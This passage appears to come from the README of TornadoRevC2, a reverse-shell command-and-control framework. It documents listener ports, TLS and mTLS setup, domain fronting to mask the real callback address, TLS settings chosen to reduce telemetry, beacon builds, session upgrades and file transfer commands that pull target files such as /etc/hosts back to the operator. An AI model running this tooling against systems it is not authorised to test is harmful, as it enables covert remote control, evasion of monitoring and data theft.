└── logs/                           Session output (created at runtime)
```

---

## TLS & mTLS Configuration

TornadoRevC2 runs three isolated reverse-shell listeners plus an optional HTTPS secondary listener. Everything under `tls_certs/` and `mtls_certs/` is auto-generated on first run and never overwritten once the full bundle is present.

| Listener | Port | Client auth | Certificates |
|----------|------|-------------|--------------|
| TCP | `4444` | none | — |
| TLS | `8443` | server-only | `tls_certs/server.pem`, `tls_certs/server.key` |
| mTLS | `9443` | mutual (client certificate required) | `mtls_certs/` bundle |
| HTTPS (h2 + http/1.1) | `--h2-port` (default: disabled) | server-only; target skips verify | reuses `tls_certs/server.pem` + `server.key` |

### Domain fronting / redirector

The HTTPS callback URL built by `http2switch` can be rewritten to point at a fronting domain instead of the handler's real address. Pass `--front-domain <host> [--front-port <port>]` at handler start; the agent's TLS SNI, `Host` header, and outbound connection will all use the fronting host, while a redirector (nginx, Cloudflare Worker, Fastly VCL) forwards `/c2/<token>` back to the real listener. The HMAC proof travels in the query string either way.

### TLS session tickets

All TLS contexts (primary TLS listener, mTLS listener, HTTPS secondary listener) set `OP_NO_TICKET` off and `num_tickets = 4`, allowing clients to resume sessions across reconnects. This matches browser behaviour and reduces full-handshake telemetry on repeated connections.

### HTTPS secondary listener

Started only when `--h2-port <port>` is passed. The listener terminates HTTP/2 and HTTP/1.1 over TLS on a single socket and negotiates the protocol via ALPN (`h2` preferred; `http/1.1` accepted as a fallback for PowerShell 5.1 targets). Both protocols run over the same hardened TLS context as the primary TLS listener: TLS 1.2 floor, TLS 1.3 ceiling where available, the same cipher list, and the same `OP_NO_COMPRESSION` / `OP_NO_RENEGOTIATION` flags.

### TLS

Auto-generated as a self-signed pair (`CN=localhost`, RSA-2048, 3650 days).

To supply your own:

```bash
python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 \
  -c tls_certs/server.pem -k tls_certs/server.key
```

If the client connects using an IP address, the server certificate should include that IP in its **Subject Alternative Name (SAN)**. Avoid disabling hostname verification unless there is a specific reason to do so.

### HTTPS file transfer

TornadoRevC2 has two HTTPS file-transfer modes, both served by a transient operator-side HTTPS server that reuses the handler's hardened TLS context (`tls_certs/server.pem` + `tls_certs/server.key`, same ciphers, TLS 1.2 floor, and `OP_*` flags as the TLS listener). No additional certificates are generated.

- **`--https` (upload)** — the operator serves the file; the target downloads it (`curl -k`, `wget --no-check-certificate`, `Invoke-WebRequest`, or `certutil`).
- **`--https-push` (download)** — the operator serves an upload endpoint at `/upload`; the target pushes the file to it via HTTP `PUT` (`curl.exe -T` or `WebClient.UploadFile` on Windows, `curl -T`, `python3`, or `python2` on Linux/Unix). The body is streamed directly to the local file — the operator never buffers the whole file in memory.

For both modes the server binds to the address resolved from the optional interface argument (`--https eth0` / `--https-push eth0`), to `0.0.0.0` if omitted, or to a specific IP if passed directly (`--https 10.10.14.7`). The URL advertised to the target uses the `-RH` value if provided, otherwise the bind IP, otherwise the interface the reverse shell sees the handler on.

The HTTPS server is torn down immediately after the transfer completes or fails. It does not persist between transfers.

**Integrity and correctness:** both modes compute the target-side SHA-256 before starting the transfer, verify the received/sent bytes against it after transfer, and abort with a clear error on mismatch. **Resume is not available** on the HTTPS transports — use the default chunked paths for resumable transfers.

**Local path resolution (download):** if the `<local>` argument is an existing directory, ends with `/` or `\`, or is otherwise a directory on the operator machine, the remote file's basename is appended automatically. `download --https-push 1 /etc/hosts ./logs` writes `./logs/hosts`, not `./logs`.

### mTLS

On first run, a full PKI is bootstrapped under `mtls_certs/`:

- `ca.pem` / `ca.key` — self-signed CA (RSA-4096, CN=`TornadoRevC2-mTLS-CA`)
- `server-mtls.pem` / `server-mtls.key` — server certificate signed by the CA
- `client.pem` / `client.key` — client certificate signed by the CA
- `ca.srl` — OpenSSL serial counter generated during certificate signing

Ship **`client.pem` + `client.key` + `ca.pem`** with the authorized client. The client must present its certificate on connect or the handshake is rejected.

**Beacon listener mTLS.** When `--beacon-mtls-ca` (or `--beacon-mtls-dir`) is passed at handler start, the beacon listener switches from server-only TLS to mutual TLS on the same certificate material:

- **Default bundle** — the listener serves `mtls_certs/server-mtls.pem` and verifies client certificates against `mtls_certs/ca.pem`.
- **Custom bundle** — pass `--beacon-mtls-dir <path>` to point the listener at a directory containing `ca.pem`, `server-mtls.pem`, and `server-mtls.key`. The beacon agent must be built against the same directory (via `beacon-build --mtls-dir <path>`), or the handshake will fail on both sides: the agent will not trust the server chain, and the server will not trust the agent's client certificate.
- **Individual overrides** — `--beacon-mtls-server-cert` and `--beacon-mtls-server-key` override the default filenames when the operator's bundle uses different names.

**The build-time and runtime bundles must match.** There is no negotiation and no fallback — a beacon built against PKI A cannot authenticate to a listener using PKI B. This is deliberate: it prevents an attacker who compromises the listener from accepting check-ins from agents built with their own CA. The interactive `beacon-build` wizard warns at build time when the selected bundle differs from the running listener's configuration.

Start with explicit paths:

```bash
python tornadorevc2.py -H 0.0.0.0 -mp 9443 \
  --mtls-ca-cert mtls_certs/ca.pem --mtls-ca-key mtls_certs/ca.key \
  --mtls-server-cert mtls_certs/server-mtls.pem --mtls-server-key mtls_certs/server-mtls.key \
  --mtls-client-cert mtls_certs/client.pem --mtls-client-key mtls_certs/client.key
```

### Upgrading a live session to mTLS

Existing sessions on plain TCP or server-auth TLS can be moved onto the mTLS listener without restarting the handler.

```bash
# From the main handler prompt
run upgrade_mtls 1 --port 9443 --host 10.10.14.7
run upgrade_mtls 1 --keep-bundle       # leave certs on disk after launch
run upgrade_mtls 1 --no-upload         # certificate bundle already uploaded manually

# From inside an attached session (switch 1)
run upgrade_mtls
```

**`upgrade_mtls` flags:**

| Flag | Default | Description |
|------|---------|-------------|
| `--port <port>` | mTLS listener port (`9443`) | Port on the handler to connect back to |
| `--host <ip>` | Session's remote address | Handler IP to connect back to |
| `--keep-bundle` | off | Leave the certificate bundle on disk after the new session starts |
| `--no-upload` | off | Skip the upload step (bundle already present on the target) |

### Flags

| Flag | Default |
|------|---------|
| `-H` / `--host` | `0.0.0.0` |
| `-p` / `--port` | `4444` |
| `--h2-port` | *(disabled)* |
| `--front-domain` | *(none — direct callback)* |
| `--front-port` | `443` |
| `--profile` | (none — built-in defaults) |
| `-tp` / `--tls-port` | `8443` |
| `-mp` / `--mtls-port` | `9443` |
| `-c` / `--cert`, `-k` / `--key` | `tls_certs/server.{pem,key}` |
| `--mtls-ca-cert` / `--mtls-ca-key` | `mtls_certs/ca.{pem,key}` |
| `--mtls-server-cert` / `--mtls-server-key` | `mtls_certs/server-mtls.{pem,key}` |
| `--mtls-client-cert` / `--mtls-client-key` | `mtls_certs/client.{pem,key}` |

---

## License

This project is licensed under the [GNU General Public License v3.0](LICENSE).